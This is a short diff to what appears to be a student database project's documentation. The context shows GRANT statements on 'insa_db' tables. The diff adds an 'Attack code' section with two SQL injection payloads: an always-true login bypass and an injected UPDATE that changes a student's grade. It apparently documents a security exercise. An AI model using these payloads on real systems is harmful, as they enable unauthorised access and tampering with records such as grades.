@@ -23,3 +23,11 @@ GRANT SELECT, INSERT, UPDATE, DELETE ON `insa_db`.`Cours_info` TO `user1`@`%`;
 
 GRANT SELECT, INSERT, UPDATE, DELETE ON `insa_db`.`Users` TO `user1`@`%`;
 ```
+
+### Attack code
+```sql
+' OR 1=1; --
+```
+```sql
+'; UPDATE `Cours_info` SET `note` = 19 WHERE `stu_id`=1; --
+```
